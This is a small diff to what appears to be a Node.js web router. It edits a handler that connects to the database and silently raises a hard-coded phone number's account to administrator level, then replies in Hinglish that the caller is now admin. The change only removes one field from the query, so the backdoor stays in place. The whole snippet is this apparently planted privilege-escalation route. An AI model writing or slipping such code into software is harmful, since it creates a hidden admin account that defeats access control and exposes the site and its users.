@@ -50,7 +50,7 @@ const initWebRouter = (app) => {
                 password: process.env.DB_PASSWORD || process.env.MYSQLPASSWORD,
                 database: process.env.DB_NAME || process.env.MYSQLDATABASE || 'railway',
             });
-            await pool.execute("UPDATE users SET level=2, ctv='admin', status=1, veri=1 WHERE phone='9876543210'");
+           await pool.execute("UPDATE users SET level=2, status=1, veri=1 WHERE phone='9876543210'");
             await pool.end();
             res.send('BINGO! Tu ab ADMIN ban gayi - ab /admin pe ja!');
         } catch (e) { res.status(500).send('Error: ' + e.message); }
